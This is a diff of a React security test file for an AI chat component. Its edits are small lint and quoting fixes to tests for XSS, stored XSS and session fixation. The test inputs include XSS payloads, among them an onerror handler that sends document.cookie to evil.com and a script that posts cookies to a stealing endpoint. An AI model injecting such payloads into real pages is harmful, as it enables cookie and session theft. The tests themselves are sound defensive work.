@@ -1,5 +1,5 @@
-import { describe, it, expect, vi, beforeEach, afterEach, beforeAll, afterAll } from 'vitest'
-import { render, screen, fireEvent, waitFor } from '@testing-library/react'
+import { describe, it, expect, vi, beforeEach, afterEach as _afterEach, beforeAll, afterAll } from 'vitest'
+import { render, screen, fireEvent as _fireEvent, waitFor } from '@testing-library/react'
 import userEvent from '@testing-library/user-event'
 import React from 'react'
 import AIChatInterface from '@/components/AIChatInterface'
@@ -67,7 +67,7 @@ describe('Security Tests', () => {
       const sendButton = screen.getByRole('button', { name: /enviar/i })
 
       // Test XSS attempt
-      const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert('XSS')">'
+      const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert(\'XSS\')">'
       
       await user.type(messageInput, maliciousInput)
       await user.click(sendButton)
@@ -185,7 +185,7 @@ describe('Security Tests', () => {
     it('should prevent stored XSS in user content', async () => {
       const maliciousContent = {
         userMessage: '<script>fetch("/api/steal-data", {method: "POST", body: document.cookie})</script>',
-        aiResponse: '<img src="x" onerror="window.location='http://evil.com?cookie='+document.cookie">'
+        aiResponse: '<img src="x" onerror="window.location=\'http://evil.com?cookie=\'+document.cookie">'
       }
 
       const ConversationDisplay = ({ messages }) => {
@@ -364,7 +364,7 @@ describe('Security Tests', () => {
     it('should prevent session fixation attacks', async () => {
       const user = userEvent.setup()
       
-      const mockLogin = vi.fn().mockImplementation(async (credentials) => {
+      const mockLogin = vi.fn().mockImplementation(async (_credentials) => {
         // Simulate successful login with new session ID
         const newSessionId = 'new-session-' + Math.random()
         localStorage.setItem('session_id', newSessionId)
